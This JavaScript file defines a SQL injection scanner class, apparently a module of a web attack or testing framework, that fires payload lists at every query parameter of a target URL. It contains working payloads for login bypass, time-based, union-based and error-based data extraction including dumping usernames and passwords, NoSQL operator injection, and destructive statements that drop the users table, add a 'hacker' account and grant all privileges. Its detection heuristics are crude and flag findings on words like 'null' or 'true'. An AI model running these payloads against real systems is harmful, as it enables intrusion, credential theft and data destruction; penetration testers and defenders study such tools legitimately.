const axios = require('axios');
const crypto = require('crypto');

class SQLInjectionExploit {
    constructor() {
        this.displayName = 'SQL Injection Scanner';
        this.description = 'Comprehensive SQL injection vulnerability detection and exploitation';
        this.severity = 'critical';
        this.category = 'web-application';
        this.version = '2.1.0';

        // SQL injection payloads categorized by database type and technique
        this.payloads = {
            // Boolean-based blind SQL injection
            boolean: [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "admin'--",
                "admin'#",
                "admin'/*",
                "' or 1=1--",
                "' or 1=1#",
                "' or 1=1/*",
                ") or '1'='1--",
                ") or ('1'='1--",
                "' OR 'x'='x",
                "' OR 'something' = 'something",
                "' OR '1'='1' --",
                "' OR 1 = 1 --",
                "' OR 1=1 LIMIT 1 --",
                "'='",
                "'LIKE'",
                "'=0--+",
                " OR 1=1",
                "' OR 'a'='a",
                "\" OR \"a\"=\"a",
                "') OR ('a'='a"
            ],

            // Time-based blind SQL injection
            timeBased: [
                "'; WAITFOR DELAY '0:0:5'--",
                "'; SELECT SLEEP(5)--",
                "'; SELECT pg_sleep(5)--",
                "' OR SLEEP(5)--",
                "' OR pg_sleep(5)--",
                "' AND SLEEP(5)--",
                "'; BENCHMARK(5000000,MD5(1))--",
                "' OR BENCHMARK(5000000,MD5(1))--",
                "' UNION SELECT SLEEP(5)--",
                "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(MID((SELECT version()),1,50),FLOOR(RAND(0)*2))) AND '1'='1",
                "; waitfor delay '0:0:5'--",
                "; SELECT SLEEP(5)#",
                "' OR IF(1=1, SLEEP(5), 0)--",
                "'; IF(1=1) WAITFOR DELAY '0:0:5'--"
            ],

            // Union-based SQL injection
            union: [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT user(),2,3--",
                "' UNION SELECT database(),2,3--",
                "' UNION SELECT version(),2,3--",
                "' UNION SELECT @@version,2,3--",
                "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
                "' UNION SELECT column_name,2,3 FROM information_schema.columns--",
                "' UNION SELECT username,password,3 FROM users--",
                "' UNION ALL SELECT NULL--",
                "' UNION ALL SELECT NULL,NULL--",
                "' ORDER BY 1--",
                "' ORDER BY 2--",
                "' ORDER BY 3--",
                "' ORDER BY 4--",
                "' ORDER BY 5--",
                "' GROUP BY 1--",
                "' GROUP BY 2--",
                "' HAVING 1=1--"
            ],

            // Error-based SQL injection
            errorBased: [
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND ExtractValue(1, CONCAT(0x5c, (SELECT version())))--",
                "' AND UpdateXML(1,CONCAT(0x5c,(SELECT version())),1)--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND ROW(1,1) > (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
                "'; SELECT * FROM non_existent_table--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            ],

            // NoSQL injection payloads
            nosql: [
                "'; return true; var foo='",
                "'; return true; //",
                "'; return 'a'=='a'; var foo='",
                "' || 1==1//",
                "' || 1==1#",
                "' || 'a'=='a",
                "'; return(true); var dum='",
                "' || true || '",
                "{\"$gt\":\"\"}",
                "{\"$ne\":null}",
                "{\"$regex\":\".*\"}",
                "{\"$where\":\"this.username == this.username\"}",
                "{\"$where\":\"return true\"}",
                "[$ne]=1",
                "[$regex]=.*",
                "[$gt]=",
                "[$nin][]="
            ],

            // Second-order SQL injection
            secondOrder: [
                "test'; INSERT INTO users VALUES('hacker','password')--",
                "test'; UPDATE users SET password='hacked' WHERE username='admin'--",
                "test'; DROP TABLE users--",
                "test'; CREATE USER hacker IDENTIFIED BY 'password'--",
                "test'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--"
            ]
        };

        // Common SQL injection signatures in responses
        this.errorSignatures = [
            // MySQL errors
            /mysql_fetch_array\(\)/i,
            /mysql_query\(\)/i,
            /mysql_connect\(\)/i,
            /Warning.*mysql_/i,
            /MySQL Error/i,
            /mysql error/i,
            /Unknown column/i,
            /Table.*doesn't exist/i,
            /You have an error in your SQL syntax/i,

            // PostgreSQL errors
            /PostgreSQL.*ERROR/i,
            /Warning.*pg_/i,
            /pg_query\(\)/i,
            /pg_exec\(\)/i,
            /PostgreSQL query failed/i,
            /Query failed.*ERROR/i,

            // Oracle errors
            /ORA-[0-9]+/i,
            /Oracle.*Driver/i,
            /Warning.*oci_/i,
            /Oracle.*Error/i,

            // SQL Server errors
            /Microsoft.*ODBC.*SQL Server/i,
            /Microsoft OLE DB Provider for SQL Server/i,
            /Unclosed quotation mark after the character string/i,
            /Syntax error.*near/i,
            /Invalid object name/i,

            // SQLite errors
            /SQLite.*error/i,
            /sqlite3.OperationalError/i,
            /no such table/i,
            /SQL logic error/i,

            // Generic SQL errors
            /SQL syntax.*error/i,
            /syntax error at or near/i,
            /unterminated quoted string/i,
            /unexpected end of SQL command/i,
            /Warning.*SQL/i,
            /Error.*SQL/i,
            /Database.*error/i,
            /Invalid query/i,
            /SQL.*Exception/i
        ];
    }

    async execute(target, options = {}) {
        try {
            const startTime = Date.now();
            const results = {
                target,
                timestamp: new Date(),
                vulnerabilities: [],
                statistics: {
                    totalTests: 0,
                    successfulInjections: 0,
                    errorBasedFindings: 0,
                    timeBasedFindings: 0,
                    unionBasedFindings: 0,
                    booleanBasedFindings: 0
                },
                detailedResults: {}
            };

            console.log(`[SQLi] Starting SQL injection scan on: ${target}`);

            // Parse target URL and extract parameters
            const targetInfo = this.parseTarget(target);
            if (!targetInfo.parameters || targetInfo.parameters.length === 0) {
                throw new Error('No testable parameters found in target URL');
            }

            console.log(`[SQLi] Found ${targetInfo.parameters.length} testable parameters`);

            // Test each parameter with different injection techniques
            for (const param of targetInfo.parameters) {
                console.log(`[SQLi] Testing parameter: ${param.name}`);

                // Boolean-based testing
                const booleanResults = await this.testBooleanInjection(targetInfo, param, options);
                results.detailedResults[`${param.name}_boolean`] = booleanResults;
                results.statistics.totalTests += booleanResults.tests.length;
                results.statistics.booleanBasedFindings += booleanResults.vulnerabilities.length;
                results.vulnerabilities.push(...booleanResults.vulnerabilities);

                // Time-based testing
                const timeResults = await this.testTimeBasedInjection(targetInfo, param, options);
                results.detailedResults[`${param.name}_time`] = timeResults;
                results.statistics.totalTests += timeResults.tests.length;
                results.statistics.timeBasedFindings += timeResults.vulnerabilities.length;
                results.vulnerabilities.push(...timeResults.vulnerabilities);

                // Union-based testing
                const unionResults = await this.testUnionInjection(targetInfo, param, options);
                results.detailedResults[`${param.name}_union`] = unionResults;
                results.statistics.totalTests += unionResults.tests.length;
                results.statistics.unionBasedFindings += unionResults.vulnerabilities.length;
                results.vulnerabilities.push(...unionResults.vulnerabilities);

                // Error-based testing
                const errorResults = await this.testErrorBasedInjection(targetInfo, param, options);
                results.detailedResults[`${param.name}_error`] = errorResults;
                results.statistics.totalTests += errorResults.tests.length;
                results.statistics.errorBasedFindings += errorResults.vulnerabilities.length;
                results.vulnerabilities.push(...errorResults.vulnerabilities);

                // NoSQL testing if applicable
                if (options.includeNoSQL) {
                    const nosqlResults = await this.testNoSQLInjection(targetInfo, param, options);
                    results.detailedResults[`${param.name}_nosql`] = nosqlResults;
                    results.statistics.totalTests += nosqlResults.tests.length;
                    results.vulnerabilities.push(...nosqlResults.vulnerabilities);
                }
            }

            results.statistics.successfulInjections = results.vulnerabilities.length;
            results.executionTime = Date.now() - startTime;

            console.log(`[SQLi] Scan completed. Found ${results.vulnerabilities.length} vulnerabilities in ${results.executionTime}ms`);

            return results;

        } catch (error) {
            console.error('[SQLi] Scan failed:', error.message);
            throw error;
        }
    }

    parseTarget(target) {
        try {
            const url = new URL(target);
            const parameters = [];

            // Extract URL parameters
            for (const [name, value] of url.searchParams.entries()) {
                parameters.push({
                    name,
                    value,
                    type: 'url',
                    location: 'query'
                });
            }

            return {
                protocol: url.protocol,
                host: url.host,
                pathname: url.pathname,
                search: url.search,
                parameters,
                baseUrl: `${url.protocol}//${url.host}${url.pathname}`
            };
        } catch (error) {
            throw new Error(`Invalid target URL: ${error.message}`);
        }
    }

    async testBooleanInjection(targetInfo, param, options) {
        const results = {
            type: 'boolean-based',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[SQLi] Testing boolean-based injection on parameter: ${param.name}`);

        for (const payload of this.payloads.boolean) {
            try {
                const testUrl = this.buildTestUrl(targetInfo, param.name, payload);
                const startTime = Date.now();

                const response = await this.makeRequest(testUrl, options);
                const responseTime = Date.now() - startTime;

                const testResult = {
                    payload,
                    url: testUrl,
                    responseTime,
                    statusCode: response.status,
                    contentLength: response.data ? response.data.length : 0,
                    hasErrors: this.detectSQLErrors(response.data),
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                // Analyze response for boolean-based injection indicators
                if (this.analyzeBooleanResponse(response, param.value, payload)) {
                    const vulnerability = {
                        type: 'SQL Injection',
                        subtype: 'Boolean-based Blind',
                        severity: 'high',
                        parameter: param.name,
                        payload,
                        evidence: this.extractEvidence(response),
                        impact: 'Potential data extraction through blind SQL injection',
                        recommendation: 'Use parameterized queries and input validation',
                        cwe: 'CWE-89',
                        owasp: 'A03:2021 – Injection'
                    };
                    results.vulnerabilities.push(vulnerability);
                    console.log(`[SQLi] Boolean-based vulnerability found: ${param.name} with payload: ${payload}`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            // Rate limiting
            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testTimeBasedInjection(targetInfo, param, options) {
        const results = {
            type: 'time-based',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[SQLi] Testing time-based injection on parameter: ${param.name}`);

        // First, establish baseline response time
        const baselineUrl = this.buildTestUrl(targetInfo, param.name, param.value);
        const baselineTimes = [];

        for (let i = 0; i < 3; i++) {
            try {
                const start = Date.now();
                await this.makeRequest(baselineUrl, options);
                baselineTimes.push(Date.now() - start);
            } catch (error) {
                // Continue with other baseline tests
            }
        }

        const averageBaseline = baselineTimes.length > 0 ?
            baselineTimes.reduce((a, b) => a + b) / baselineTimes.length : 1000;

        for (const payload of this.payloads.timeBased) {
            try {
                const testUrl = this.buildTestUrl(targetInfo, param.name, payload);
                const startTime = Date.now();

                const response = await this.makeRequest(testUrl, options);
                const responseTime = Date.now() - startTime;

                const testResult = {
                    payload,
                    url: testUrl,
                    responseTime,
                    baselineTime: averageBaseline,
                    timeDifference: responseTime - averageBaseline,
                    statusCode: response.status,
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                // Check if response time indicates time-based injection
                if (responseTime > averageBaseline + 4000) { // 4+ second delay indicates injection
                    const vulnerability = {
                        type: 'SQL Injection',
                        subtype: 'Time-based Blind',
                        severity: 'high',
                        parameter: param.name,
                        payload,
                        evidence: `Response time: ${responseTime}ms (baseline: ${averageBaseline}ms)`,
                        impact: 'Potential data extraction through time-based blind SQL injection',
                        recommendation: 'Use parameterized queries and input validation',
                        cwe: 'CWE-89',
                        owasp: 'A03:2021 – Injection'
                    };
                    results.vulnerabilities.push(vulnerability);
                    console.log(`[SQLi] Time-based vulnerability found: ${param.name} with ${responseTime}ms delay`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            // Rate limiting
            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testUnionInjection(targetInfo, param, options) {
        const results = {
            type: 'union-based',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[SQLi] Testing union-based injection on parameter: ${param.name}`);

        for (const payload of this.payloads.union) {
            try {
                const testUrl = this.buildTestUrl(targetInfo, param.name, payload);
                const startTime = Date.now();

                const response = await this.makeRequest(testUrl, options);
                const responseTime = Date.now() - startTime;

                const testResult = {
                    payload,
                    url: testUrl,
                    responseTime,
                    statusCode: response.status,
                    contentLength: response.data ? response.data.length : 0,
                    hasErrors: this.detectSQLErrors(response.data),
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                // Check for union-based injection indicators
                if (this.analyzeUnionResponse(response, payload)) {
                    const vulnerability = {
                        type: 'SQL Injection',
                        subtype: 'Union-based',
                        severity: 'critical',
                        parameter: param.name,
                        payload,
                        evidence: this.extractUnionEvidence(response),
                        impact: 'Direct data extraction possible through UNION queries',
                        recommendation: 'Use parameterized queries and input validation',
                        cwe: 'CWE-89',
                        owasp: 'A03:2021 – Injection'
                    };
                    results.vulnerabilities.push(vulnerability);
                    console.log(`[SQLi] Union-based vulnerability found: ${param.name} with payload: ${payload}`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            // Rate limiting
            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testErrorBasedInjection(targetInfo, param, options) {
        const results = {
            type: 'error-based',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[SQLi] Testing error-based injection on parameter: ${param.name}`);

        for (const payload of this.payloads.errorBased) {
            try {
                const testUrl = this.buildTestUrl(targetInfo, param.name, payload);
                const startTime = Date.now();

                const response = await this.makeRequest(testUrl, options);
                const responseTime = Date.now() - startTime;

                const errorDetected = this.detectSQLErrors(response.data);
                const testResult = {
                    payload,
                    url: testUrl,
                    responseTime,
                    statusCode: response.status,
                    contentLength: response.data ? response.data.length : 0,
                    hasErrors: errorDetected,
                    errorDetails: errorDetected ? this.extractErrorDetails(response.data) : null,
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                // Check for error-based injection
                if (errorDetected) {
                    const vulnerability = {
                        type: 'SQL Injection',
                        subtype: 'Error-based',
                        severity: 'high',
                        parameter: param.name,
                        payload,
                        evidence: testResult.errorDetails,
                        impact: 'Database information disclosure through error messages',
                        recommendation: 'Use parameterized queries, input validation, and proper error handling',
                        cwe: 'CWE-89',
                        owasp: 'A03:2021 – Injection'
                    };
                    results.vulnerabilities.push(vulnerability);
                    console.log(`[SQLi] Error-based vulnerability found: ${param.name} with errors: ${testResult.errorDetails}`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            // Rate limiting
            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testNoSQLInjection(targetInfo, param, options) {
        const results = {
            type: 'nosql',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[SQLi] Testing NoSQL injection on parameter: ${param.name}`);

        for (const payload of this.payloads.nosql) {
            try {
                const testUrl = this.buildTestUrl(targetInfo, param.name, payload);
                const startTime = Date.now();

                const response = await this.makeRequest(testUrl, options);
                const responseTime = Date.now() - startTime;

                const testResult = {
                    payload,
                    url: testUrl,
                    responseTime,
                    statusCode: response.status,
                    contentLength: response.data ? response.data.length : 0,
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                // Check for NoSQL injection indicators
                if (this.analyzeNoSQLResponse(response, param.value, payload)) {
                    const vulnerability = {
                        type: 'NoSQL Injection',
                        subtype: 'MongoDB/NoSQL',
                        severity: 'high',
                        parameter: param.name,
                        payload,
                        evidence: this.extractEvidence(response),
                        impact: 'Potential NoSQL database manipulation and data extraction',
                        recommendation: 'Use proper input validation and parameterized NoSQL queries',
                        cwe: 'CWE-943',
                        owasp: 'A03:2021 – Injection'
                    };
                    results.vulnerabilities.push(vulnerability);
                    console.log(`[SQLi] NoSQL vulnerability found: ${param.name} with payload: ${payload}`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            // Rate limiting
            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    buildTestUrl(targetInfo, paramName, payload) {
        const url = new URL(targetInfo.baseUrl);

        // Set original parameters
        for (const param of targetInfo.parameters) {
            if (param.name === paramName) {
                url.searchParams.set(param.name, payload);
            } else {
                url.searchParams.set(param.name, param.value);
            }
        }

        return url.toString();
    }

    async makeRequest(url, options = {}) {
        const requestOptions = {
            method: 'GET',
            url,
            timeout: options.timeout || 30000,
            headers: {
                'User-Agent': options.userAgent || 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                ...options.headers
            },
            validateStatus: () => true // Accept all status codes
        };

        return await axios(requestOptions);
    }

    detectSQLErrors(responseData) {
        if (!responseData || typeof responseData !== 'string') {
            return false;
        }

        return this.errorSignatures.some(signature => signature.test(responseData));
    }

    extractErrorDetails(responseData) {
        const matches = [];
        this.errorSignatures.forEach(signature => {
            const match = responseData.match(signature);
            if (match) {
                matches.push(match[0]);
            }
        });
        return matches.join(', ');
    }

    analyzeBooleanResponse(response, originalValue, payload) {
        // Simple heuristic: if the response is significantly different from expected
        // and doesn't contain obvious errors, it might be a boolean-based injection
        if (!response.data) return false;

        // Check for common boolean-based indicators
        const indicators = [
            /true/i,
            /false/i,
            /admin/i,
            /login.*success/i,
            /welcome/i,
            /dashboard/i
        ];

        return indicators.some(indicator => indicator.test(response.data));
    }

    analyzeUnionResponse(response, payload) {
        if (!response.data) return false;

        // Check for UNION query success indicators
        const unionIndicators = [
            /null/i,
            /version\(\)/i,
            /user\(\)/i,
            /database\(\)/i,
            /@@version/i,
            /information_schema/i,
            /table_name/i,
            /column_name/i
        ];

        return unionIndicators.some(indicator => indicator.test(response.data));
    }

    analyzeNoSQLResponse(response, originalValue, payload) {
        if (!response.data) return false;

        // Check for NoSQL injection indicators
        const nosqlIndicators = [
            /".*":\s*true/i,
            /\$gt/i,
            /\$ne/i,
            /\$regex/i,
            /\$where/i,
            /ObjectId/i,
            /mongodb/i
        ];

        return nosqlIndicators.some(indicator => indicator.test(response.data));
    }

    extractEvidence(response) {
        if (!response.data) return 'No response data';

        // Extract first 200 characters for evidence
        return response.data.substring(0, 200) + (response.data.length > 200 ? '...' : '');
    }

    extractUnionEvidence(response) {
        if (!response.data) return 'No response data';

        // Look for specific UNION indicators in response
        const evidence = [];

        if (response.data.includes('null')) evidence.push('NULL values detected');
        if (/version\(\)/i.test(response.data)) evidence.push('Version function output');
        if (/information_schema/i.test(response.data)) evidence.push('Information schema access');

        return evidence.length > 0 ? evidence.join(', ') : this.extractEvidence(response);
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async getInfo() {
        return {
            name: this.displayName,
            description: this.description,
            version: this.version,
            severity: this.severity,
            category: this.category,
            techniques: [
                'Boolean-based Blind SQL Injection',
                'Time-based Blind SQL Injection',
                'Union-based SQL Injection',
                'Error-based SQL Injection',
                'NoSQL Injection'
            ],
            parameters: [
                {
                    name: 'delay',
                    description: 'Delay between requests in milliseconds',
                    type: 'number',
                    default: 100
                },
                {
                    name: 'timeout',
                    description: 'Request timeout in milliseconds',
                    type: 'number',
                    default: 30000
                },
                {
                    name: 'includeNoSQL',
                    description: 'Include NoSQL injection testing',
                    type: 'boolean',
                    default: false
                },
                {
                    name: 'userAgent',
                    description: 'Custom User-Agent header',
                    type: 'string',
                    default: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                }
            ],
            payloadCount: Object.values(this.payloads).reduce((total, arr) => total + arr.length, 0),
            errorSignatures: this.errorSignatures.length
        };
    }
}

module.exports = SQLInjectionExploit;
